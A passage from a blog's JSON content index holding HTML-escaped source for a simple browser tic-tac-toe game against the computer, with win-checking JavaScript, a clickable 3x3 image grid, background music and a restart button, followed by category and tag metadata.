1;&#125;elseif(a[1]==2&amp;&amp;a[4]==2&amp;&amp;a[7]==2||a[2]==2&amp;&amp;a[5]==2&amp;&amp;a[8]==2||a[3]==2&amp;&amp;a[4]==2&amp;&amp;a[5]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;elseif(a[2]==2&amp;&amp;a[4]==2&amp;&amp;a[6]==2||a[6]==2&amp;&amp;a[7]==2&amp;&amp;a[8]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;if(a[0]==1&amp;&amp;a[1]==1&amp;&amp;a[2]==1||a[0]==1&amp;&amp;a[4]==1&amp;&amp;a[8]==1||a[0]==1&amp;&amp;a[3]==1&amp;&amp;a[6]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elseif(a[1]==1&amp;&amp;a[4]==1&amp;&amp;a[7]==1||a[2]==1&amp;&amp;a[5]==1&amp;&amp;a[8]==1||a[3]==1&amp;&amp;a[4]==1&amp;&amp;a[5]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elseif(a[2]==1&amp;&amp;a[4]==1&amp;&amp;a[6]==1||a[6]==1&amp;&amp;a[7]==1&amp;&amp;a[8]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elsereturn 0;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=&quot;1&quot;cellpadding=&quot;1&quot;cellspacing=&quot;1&quot;align=&quot;center&quot;&gt;&lt;caption&gt;Play with NPC&lt;audio loop=&quot;loop&quot; autoplay=&quot;autoplay/&quot;&gt;&lt;source src=&quot;I Need To Be In Love.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/caption&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div0&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci0&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div1&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci1&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div2&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci2&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div3&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci3&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div4&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci4&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div5&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci5&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div6&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci6&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div7&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci7&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div8&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci8&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;center&gt;&lt;button onclick=&quot;restart()&quot;&gt;重新开始&lt;/button&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 附地址：点击与愚蠢的电脑过招井字棋，输了算你牛","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]}]}